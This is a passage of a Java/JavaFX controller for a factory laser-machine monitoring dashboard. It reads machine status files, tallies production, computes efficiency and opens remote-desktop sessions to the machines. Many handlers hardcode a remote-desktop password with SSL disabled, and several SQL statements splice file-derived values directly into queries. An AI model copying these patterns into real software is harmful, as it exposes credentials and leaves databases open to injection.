       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction3(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane3.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction4(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane4.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction5(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane5.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction6(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane6.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    
    @FXML
    void viewerhackeraction7(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane7.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    
    @FXML
    void viewerhackeraction8(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane8.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    
    @FXML
    void viewerhackeraction9(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane9.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    
    @FXML
    void viewerhackeraction10(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane10.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    
    @FXML
    void viewerhackeraction11(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane11.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    
    ///////////////////////////////
    
    @FXML
    void viewerhackeraction12(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane12.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction13(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane13.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction14(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane14.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction15(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane15.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction16(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane16.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction17(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane17.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction18(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane18.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction19(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane19.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction20(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane20.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    
    @FXML
    void viewerhackeraction21(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane21.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    @FXML
    void viewerhackeraction22(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane22.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
    }
    
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    

    @FXML
    void refreshaction(ActionEvent event) throws InterruptedException, SQLException {
        
        
      try {  
        
        
    new Thread(new Runnable() {
    @Override
    public void run() {
        
        
        
        
      
      //////////////////////////////////////////////// All Machines //////////////////////////////////////////////////////////////////////////////////////////////////////////////
     
        
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
//       
      workingmachinesno=0; 
      refresh1.setStyle("-fx-background-color:green;");
//      PulseTransition ptt=new PulseTransition(vboxpane1);
//      ptt.setAutoReverse(true);
//      ptt.setCycleCount(2);
//      ptt.pl
      /////////////////////// Machine 1 ////////////////////////////
      String machine_number1="1";  
//      String poth1 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth1=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg1=new File (poth+"\\Machine1.kady");
        if (lkg1.exists()) {
            
            try {
           
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg1));
           
      
           
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
//           if(summe111.equals(v7)) {
//               vboxpane1.setStyle("-fx-background-color:yellow;");
//           }
//           else {
//               vboxpane1.setStyle("-fx-background-color:transparent;");
//           }
           
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno1.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod1.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit1.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           
           mod1.setText(v5);
           unit1.setText(v6);
           
           buffr.close();
           /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
           areatoupdate.clear();
           
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine1.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
             areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine1.txt"));
                    pnm.print(input);
                    pnm.close();
                    areatoupdate.clear();

               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine1.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.WRITE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine1.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine1.txt"));
             ndk.print(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe1.txt"));
             summe1=Integer.parseInt(wq.readLine());
             wq.close();
                
          try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine1.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 else {
             String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
             }
             nog1.setText(Integer.toString(sum-summe1));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }
          

//nog1.setText("N/A");
//nog1.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
          
          //////////////////////////////////Create Performance Here////////////////////////////////////
          
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane1.setStyle("-fx-background-color:orange;");
              
          }
          
          else {
              
                vboxpane1.setStyle("-fx-background-color:transparent;");
              
                 long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff1.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff1.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff1.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff1.setText("N/A");
          }
              
          }
          
          
         
         
          /////////////////////////////////////////////////////////////////////////////////////////////
            
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
   
      
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
       
           } catch (FileNotFoundException ex) {
              
           
              
              
        } catch (IOException ex) {
            
            lkg1.delete();
        }
            
            
    workingmachinesno=workingmachinesno+1;
    
    
    
            
        }
    else { 
        /////////////////////// Machine 1 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno1.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno1.setText("Machine   "+machine_number1);
        nog1.setText("0");
        eff1.setText("0%");
        mod1.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod1.setText("Machine isn't working");
        unit1.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit1.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
            try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
       
    
    refresh1.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
   
        
//    }
//    }).start(); 
//       
    
    
    
    
    
    
    
    
    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
//       
           
    refresh11.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 2 ////////////////////////////
      String machine_number2="2";  
//      String poth2 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth2=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg2=new File (poth+"\\Machine2.kady");
        if (lkg2.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg2));
     
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno11.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod11.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit11.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod11.setText(v5);
           unit11.setText(v6);
           
    buffr.close();
            
           
    
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
